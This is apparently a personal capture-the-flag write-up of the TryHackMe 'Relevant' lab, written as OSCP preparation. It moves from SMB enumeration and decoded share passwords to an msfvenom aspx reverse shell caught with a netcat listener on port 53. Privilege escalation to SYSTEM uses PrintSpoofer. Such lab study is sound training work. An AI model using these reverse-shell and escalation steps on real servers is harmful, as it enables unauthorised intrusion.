---
title: Relevant
draft: false
tags:
  - thm
  - oscp
  - medium
---
This room starts of suggesting to treat this as an actual pentest, stating there are multiple exploitable vulnerabilities. This machine also will not REQUIRE metasploit, which is great as I prep for OSCP which only allows metasploit on 1 machine. The IP address of my box changes throughout this, since I had to stop and come back.


# Initial Port Scan
```
map -Pn -sV -p- $IP                                     
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.59.249
Host is up (0.18s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

# Enumeration
## SMB
So there's a lot to look at here. Lets start with enumerating SMB.
### Non-credentialed
```
nmap -Pn -sV --script=smb-enum-users,smb-enum-shares -p445 $IP 
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.59.249
Host is up (0.20s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.59.249\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.59.249\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.59.249\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.59.249\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
```

There is anonymous read/write access on the nt4wrksv drive. 

Using smbclient, we find a passwords.txt file with some encoded passwords.
```
smbclient -N \\\\10.10.59.249\\nt4wrksv
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul  8 10:03:27 2024
  ..                                  D        0  Mon Jul  8 10:03:27 2024
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5137259 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit

cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

We can throw those into cyberchef and select `From Base64` (just a common encoding method, we could have checked others if this came back with gibberish or didn't work)

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

We see that RDP is open so we can test these credentials for RDP access. However, we can also now use these credentials for more SMB enumeration.

### Credentialed
```
nmap -Pn -sV --script=smb-enum-users,smb-enum-shares --script-args 'smbusername=bob,smbpassword=!P@$$W0rD!123' -p445 $IP
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.59.249
Host is up (0.18s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-enum-shares: 
|   account_used: bob
|   \\10.10.59.249\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.59.249\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.59.249\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.59.249\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
```

Bob has read/write access to the share that was anonymously readable. We may likely be able to upload a payload and execute it. Bill's access was not much different. If we can upload files to this location, maybe there's a way to execute them.

## HTTP
Lets open our web browser and just view the webpages. There port 80 and port 49663.

Both ports just open up the default IIS landing page. Something I have seen in previous boxes is that a share on the box is linked to the web directory. Lets test if we can get the passwords.txt from the webpage.

And wouldn't you know it...
![[RelevantShareExposed.png]]

We get access to the site this way. Who needs gobuster! I tried each web port and with or without the directory before this combination finally worked.

# Initial Foothold

Now, the plan is to get some kind of shell, utilizing this. 
I will use msfvenom to craft a payload to use.
### Notice
I wound up looking into the write-up from the room designer. I could NOT get a shell to work, either .exe, .asp, .aspx... Until finally I look at the writeup and find they use `windows/shell_reverse_tcp` with `LPORT=53` and use `aspx` for he file format. This payload eventually worked after attempting it a few times.

Used `nc -lvnp 53` to receive the reverse shell.

Once on, I find the share location, and navigate to it. Then, use smb to upload winpeas and find some goodies.

```
Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [*] OS Version: 1607 (14393)
 [*] Enumerating installed KBs...
 [!] CVE-2019-0836 : VULNERABLE
  [>] https://exploit-db.com/exploits/46718
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

 [!] CVE-2019-1064 : VULNERABLE
  [>] https://www.rythmstick.net/posts/cve-2019-1064/

 [!] CVE-2019-1130 : VULNERABLE
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                                                                            
  [>] https://github.com/apt69/COMahawk

 [!] CVE-2020-0668 : VULNERABLE
  [>] https://github.com/itm4n/SysTracingPoc

 [!] CVE-2020-0683 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2020-0683
  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1

 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [*] Finished. Found 9 potential vulnerabilities.
```

Once that is ran, I navigated to `C:\Users\Bob\Desktop\` to grab the user flag.

# Privilege Escalation

I also spied from the write-up that there's a printspoofer tool that can be used to abuse SeImpersonatePrivilege being set for a user.

Find the binary on github and upload it through our trusty share. Then run it.

```
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

This is specifically exploitable due to having SeImpersonatePrivilege.

Once this is done, simply navigate to `C:\Users\Administrator\Desktop` and grab the flag there.

![[RelevantCompleted.png]]

Not my proudest achievement seeing the answer. However, I just did not understand why the reverse shells weren't sticking. Even trying to upload an exe and use a webshell to run that exe was failing. Perhaps that would have worked with port 53? Googling how to exploit SeImpersonatePrivilege could have also led me down the path to how to exploit the box. Definitely a learning experience for sure.